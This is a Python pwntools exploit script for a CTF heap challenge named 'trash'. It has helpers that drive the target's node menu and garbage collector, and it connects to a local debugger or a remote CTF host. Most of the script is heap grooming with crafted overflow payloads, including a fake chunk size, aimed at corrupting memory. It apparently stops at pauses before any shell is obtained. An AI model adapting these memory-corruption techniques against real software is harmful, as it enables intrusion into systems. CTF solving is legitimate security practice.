r"""I'm extremely proud of this code."""
import os
os.environ['TERM'] = 'xterm-256color'
from pwn import *
context.update(arch='amd64')

cwd = '/home/tukan/dev/hx/ctf/gctf17/trash'

TARGET = 'gdb'
# TARGET = 'live'

bin_ = os.path.join(cwd, 'dbg.trash')
b = ELF(bin_)
# libc = ELF(os.path.join('/lib/x86_64-linux-gnu/libc.so.6'))

execute = [
    'b main\ncommands\nset epoch=0x1122334455660001\ndel 1\ncontinue\nend\n',
    'b trash.c:93 if meta==0x6036c0\nignore 2 1\n',
    'continue'
]
execute = flat(map(lambda x: x + '\n', execute))


def conn():
    if TARGET == 'gdb':
        env = os.environ.copy()
        r = process(bin_, aslr=False)
        gdb.attach(r, gdbscript=execute)
    elif TARGET == 'rr':
        def replay():
            pwnlib.util.misc.run_in_new_terminal('rr replay')
        r = process('rr record ' + bin_, shell=True)
        atexit.register(replay)
    elif TARGET == 'qira':
        # Start withsho
        # stdbuf -oO qira -s ./books_757b0a24b0193ec8989290ec6923dd1d
        r = remote('127.0.0.1', 4000)
    elif TARGET == 'naked':
        r = remote('localhost', 24242)
    else:
        r = remote('flatearth.fluxfingers.net', 1747)

    return r


c = conn()
m = None


def add_node(idx, data, size=None):
    c.sendlineafter("quit", "0")
    c.sendlineafter("?", " ".join(str(i) for i in idx))
    c.sendlineafter("?", str(len(data)))
    c.send(data)

def copy_node(idx1, idx2):
    c.sendlineafter("quit", "2")
    c.sendlineafter("?", " ".join(str(i) for i in idx1))
    c.sendlineafter("?", " ".join(str(i) for i in idx2))

def print_node(idx):
    c.sendlineafter("quit", "1")
    c.sendlineafter("?", " ".join(str(i) for i in idx))
    return c.recvuntil("0) new node")

def run_gc():
    c.sendlineafter("quit", "3")


guardian = [0]      # to kill the refs to the others
dicktrap = [9]      # oh my
add_node(guardian, "A")
add_node(dicktrap, "C")



dummy1 = [1]
dummy2 = [2]
hickey = [3]

add_node(dummy1, '1'*(1024-32))
add_node(dummy2, p64(0x41)*((512-32)/8))

# kill the refs
copy_node(guardian, dummy1)
copy_node(guardian, dummy2)
run_gc()


b = '\xff'*(48 + 112 + 1024 - 32 + 16) + p64(0x80) + '\xff'
add_node(hickey, b)       # ezek a szamok mit jelentek ki tudja

for i in range(256):
    run_gc()

# kill the dicktrap, later it's gonna be used
copy_node(guardian, dicktrap)
run_gc()
pause()
# from top
add_node(dummy1, '4'*256)
pause()

# data comes from the fastbin chunk
dlen = 128-33
buf = '\x41' * dlen
add_node(dummy2, buf.ljust(dlen))

c.interactive()
